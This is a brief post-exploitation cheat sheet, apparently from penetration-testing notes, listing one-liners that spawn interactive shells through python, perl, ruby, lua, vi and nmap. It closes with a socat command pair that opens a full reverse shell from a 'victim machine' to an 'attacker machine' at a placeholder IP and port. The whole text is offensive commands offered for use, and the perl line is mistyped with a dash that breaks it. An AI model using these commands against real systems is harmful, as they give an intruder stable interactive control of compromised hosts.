
# Spawning a TTY Shell


check if the shell is tty   by typing  **tty**

## python

    python -c 'import pty; pty.spawn("/bin/sh")'

    python3 -c 'import pty; pty.spawn("/bin/sh")'

## echo

    echo os.system('/bin/bash')

## bash

    /bin/bash -i

## sh

    /bin/sh -i

## perl

    perl —e 'exec "/bin/sh";'

    perl: exec "/bin/sh";

## ruby

    ruby: exec "/bin/sh"

## lua

    lua: os.execute('/bin/sh')

## IRB

    exec "/bin/sh"

## vi

    :!bash

    :set shell=/bin/bash:shell

## nmap

    !sh

## socat

    on attacker machine : socat -,raw,echo=0 tcp-listen:<port> 
    on victim mahcine   : socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<ip>:<port>  

##

